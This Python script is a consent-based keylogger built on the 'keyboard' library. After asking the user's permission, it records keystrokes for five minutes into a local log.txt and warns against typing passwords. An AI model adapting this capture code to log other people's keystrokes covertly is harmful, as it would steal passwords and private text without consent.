import keyboard
import os
import time

Auto_Stop_Time = 300   
Log_File = "log.txt" 

class Keylogger:
    def __init__(self):
        self.log = ""
        self.running = False
        self.log_file_path = os.path.join(os.getcwd(), Log_File)  

    def helper(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            else:
                name = f"[{name.upper()}]"
        self.log += name

    def save(self):
        with open(self.log_file_path, "a") as log_file:
            log_file.write(self.log)

    def stop(self):
        self.save()  
        print("Keylogger stopped. Logs have been saved to:", self.log_file_path)
        keyboard.unhook_all()
        self.running = False

    def Permission(self):
        permission = input("Do you want to start the keylogger? (yes/no): ")
        if permission.lower() == "yes":
            print("""Keylogger started.\nThe Keylogger will log and store everything that you type on your keyboard for the next 5 minutes.\nPlease avoid typing sensitive information such as passwords.\nPlease do not close the terminal.""")
            self.running = True
            keyboard.on_release(callback=self.helper)
            time.sleep(Auto_Stop_Time)  
            self.stop()  
        else:
            print("Keylogger not started.")

if __name__ == "__main__":
    keylogger = Keylogger()
    try:
        keylogger.Permission()
    except KeyboardInterrupt:
        keylogger.stop()  
